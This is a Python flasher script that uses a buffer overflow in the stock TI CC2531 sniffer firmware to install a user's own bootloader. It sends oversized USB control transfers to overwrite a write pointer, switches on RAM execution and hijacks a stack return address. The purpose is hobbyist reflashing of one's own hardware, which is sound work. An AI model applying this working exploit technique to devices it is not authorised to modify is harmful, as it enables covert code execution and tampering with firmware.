#!/usr/bin/python

# SPDX-FileCopyrightText: 2023 Andreas Sig Rosvall
#
# SPDX-License-Identifier: GPL-3.0-or-later

"""

CCUSBWPAN Adapter Project
Copyright (c) 2023 Andreas Sig Rosvall

This program is free software: you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free Software
Foundation, either version 3 of the License, or (at your option) any later
version.
This program is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.  See the GNU General Public License for more details.
You should have received a copy of the GNU General Public License along with
this program.  If not, see http://www.gnu.org/licenses/.


FLASHER FOR TEXAS INSTRUMENTS CC2531 USB DONGLE WITH STOCK SNIFFER FIRMWARE
-------------------------------------------------------------------------------
Flash your own bootloader to a stock TI CC2531USB-RD dongle, no tools required.

How it works:
The stock firmware expects some packet filtering parameters of limited length
when it receives a USB control transfer with bmRequestType 0x40 and bRequest
0xD2.
The control transfer payload is written to xdata 0x020F, and the (fat) write
pointer is located at 0x0371. As the length of the transfer is not checked,
it's possible to overwrite the pointer with an arbitrary address, and have
subsequent writes go there.
Additionally, the CC2531 has most special function registers mapped into xdata,
and allows running code from xdata. This program exploits those features, by
writing the given executable binary to xdata, setting the XMAP bit in the MEMCTR
special function register, and finally overwriting a return pointer on stack to
jump to the code written to xdata.

"""

import usb
import time
from dataclasses import dataclass


def u8(n):
    return n.to_bytes(1, 'little')


def u16(n):
    return n.to_bytes(2, 'little')


@dataclass
class MemLayout:
    transfer_buf_start: int
    vars: tuple
    stack_ret: int


# TI OEM sniffer firmware uses 0x1c0 .. 0x3a0 and 0x1e90 .. 0x1eb0,
# and 0x1f00 .. 0x1fff is where the data address space is mapped in.
FREE_SPACE = range(0x03a0, 0x1e90)


# It seems there are multiple versions of the stock firmware with
# varying memory layouts. That's annoying.
MEM_LAYOUTS = {
    0x8391: MemLayout(
        # Start of control transfer buffer
        transfer_buf_start = 0x020f,

        # Stuff we'll overwrite (adresses are absolute)
        vars = (
            # Name        addr    type
            ('usb_state', 0x035d, u8),     # USB or endpoint state machine variable
            ('req_state', 0x0364, u8),     # Request handler state machine variable
            ('wptr',      0x0371, u16),    # Request write pointer
            ('addrspace', 0x0373, u8),     # Request write pointer address space
            ('wlen',      0x0375, u16),    # Remaining request write length
            ('data',      0x038f, bytes),  # Data that will get written at wptr+32
        ),

        # Return address on stack we'll overwrite
        stack_ret = 0xc2,
    ),

    0x0821: MemLayout(
        transfer_buf_start = 0x0202,
        vars = (
            ('usb_state', 0x0377, u8),
            ('req_state', 0x037e, u8),
            ('wptr',      0x038b, u16),
            ('addrspace', 0x038d, u8),
            ('wlen',      0x038f, u16),
            ('data',      0x03a2, bytes),
        ),
        stack_ret = 0xc2,
    ),
}


def construct_payload(layout, **kwargs):
    """
    Build the exploit payload using MEM_LAYOUT to convert and place named arguments
    """
    payload = b''
    for name, addr, func in layout.vars:
        padding = bytes(addr - layout.transfer_buf_start - len(payload))
        value = func(kwargs[name])
        payload += padding + value
    return payload


def write_exploit(dev, layout, data, addr, idata=False):
    """
    Writes `data` to `addr`.
    The address space is xdata unless `idata` is True.
    Might stomp on a few bytes below `addr`
    """
    print(f"    Writing {len(data)} bytes to {addr:#06x}")
    payload = construct_payload(
        layout,
        usb_state = 2,               # Must be 2
        req_state = 2,               # Must be 2
        wptr      = addr - 32,       # Pointer is updated (+=32) before being read
        addrspace = int(idata),      # 0 for xdata, 1 for idata
        wlen      = len(data) + 32,  # Remaining length of transfer
        data      = data             # The data that will get written to `addr`
    )
    dev.ctrl_transfer(
        bmRequestType=0x40,
        bRequest=0xd2,
        wValue=0,
        wIndex=0,
        data_or_wLength=payload
    )


def upload_file_contents(dev, layout, paths, offset):
    data = b''.join(open(p, 'rb').read() for p in paths)
    print('Uploading files')
    write_exploit(dev, layout, data, offset)


def enable_xmap(dev, layout):
    """
    Enable running code from RAM aka. XMAP. XDATA is mapped in to CODE space at 0x8000,
    such that CODE addr 0x8000 corresponds to XDATA addr 0.
    """
    print("Enabling running from SRAM")
    MEMCTR = 0xc7 + 0x7000
    MEMCTR_ENABLE_XMAP = 1 << 3
    write_exploit(dev, layout, u8(MEMCTR_ENABLE_XMAP), MEMCTR)


def overwrite_return_address(dev, layout, addr):
    """
    Change a return address on stack to cause a later jump to `addr`.
    """
    print(f"Overwriting return address on stack to {addr:#06x}")
    write_exploit(dev, layout, u16(addr), layout.stack_ret, idata=True)


def find_oem_device():
    VID, PID = 0x0451, 0x16ae
    print("Looking for CC2531 USB Dongle matching",
          f"idVendor={VID:04x}",
          f"idProduct={PID:04x}")
    dev = usb.core.find(idVendor=VID, idProduct=PID)
    assert dev, "Failed to find matching USB device"
    dev.reset()
    dev.set_configuration()
    print('Found device:', dev.manufacturer, dev.product,
          'on bus', dev.bus, "port", *dev.port_numbers)
    return dev


def find_new_device_on_same_usb_port(bus, port_numbers):
    print("Watching USB port...")
    for retry in range(1, 10):
        time.sleep(1)
        dev = usb.core.find(bus=bus, port_numbers=port_numbers)
        if dev:
            try:
                dev.set_configuration()
                print('Found device:', dev.manufacturer, dev.product,
                      'on bus', dev.bus, "port", *dev.port_numbers)
                return dev
            except usb.core.USBError as e:
                print(f"    Not responding yet ({e})...")
        else:
            print("    Nothing there yet...")


if __name__ == '__main__':
    import sys

    prog, *paths = sys.argv

    offset = FREE_SPACE.start
    XMAP_BASE = 0x8000

    USAGE = f"""
    USAGE: {prog} binary [binary ...]

    binary: Path to 8051 binary file to be executed from xdata at {offset:#06x},
            corresponding to code address {offset + XMAP_BASE:#06x}.

    When given multiple paths, the contents of all files will be concatenated
    (in given order) before upload.

    Total size is limited by both maximum control transfer size (4 kB on Linux)
    and the size of ram unused by the sniffer firmware ({len(FREE_SPACE)} bytes).

    Example: {prog} stub.bin bootloader.bin
    """

    assert paths, "Missing arguments" + __doc__ + USAGE

    dev = find_oem_device()
    assert dev.bcdDevice in MEM_LAYOUTS, f"This dongle with bcdDevice={dev.bcdDevice} is not yet supported. Please open an issue."
    layout = MEM_LAYOUTS[dev.bcdDevice]
    upload_file_contents(dev, layout, paths, offset)
    enable_xmap(dev, layout)
    overwrite_return_address(dev, layout, offset + XMAP_BASE)
    print("CC2531 should now be running uploaded binaries")
    new_dev = find_new_device_on_same_usb_port(dev.bus, dev.port_numbers)
    assert new_dev, "Uh oh! Device fell off USB port. Try unplugging it and plug it back in."
